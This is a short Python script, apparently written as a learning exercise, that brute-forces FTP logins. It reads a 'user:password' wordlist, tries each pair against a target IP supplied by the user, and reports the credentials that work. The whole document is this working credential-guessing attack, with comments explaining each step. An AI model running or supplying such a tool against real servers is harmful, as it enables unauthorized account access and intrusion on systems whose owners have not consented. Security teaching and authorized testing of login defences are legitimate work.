
#!/usr/bin/python3
# -------------------
# imports
import ftplib
# -------------------
"""
We have a user, password file that is formatted like this:
        user:password
So when we read the file with lineread, we split at the colon.
Note - as usual we do have to split the \n from each line,
    or else the program will send that newline with the password.
"""
# ---------------------------------------
def brutelogin(hostname, passwdfile):
    try:
        file = open(passwdfile, 'r')  # Try to open and read the file.
    except:
        print(f'[-] Files does not exist.')
    # -------------------------------------
    # If the file is active, read line by line.
    for line in file.readlines():
        username = line.split(':')[0]               # user:password - take from left of colon
        password = line.split(':')[1].strip('\n')   # take right of colon, and remove each new line also.
        print(f'[+] Trying: {username} / {password}')  # Indicate what is being tried from file.
        #  Now try each collected  username:password to FTP login
        try: 
            ftp = ftplib.FTP(hostname)
            login = ftp.login(username, password)
            print(f'[+] Login Succeeded with: {username} / {password}')
            ftp.quit()
            return (username, password)  # Return, not needed, but it is  a clean exit from the for loop.
        # 
        except:
            pass    # We are passing to just ignore and not take up memory
    # ----------------------------------
    # Statement at end, IF username/password is not found in for loop
    print(f'[-] Password Not in List.')
# -------------------------------------------------------


host  = input("[*] Enter target IP address: ")
passwdfile = input("[*] Enter User/Password File Path: ")
brutelogin(host, passwdfile)
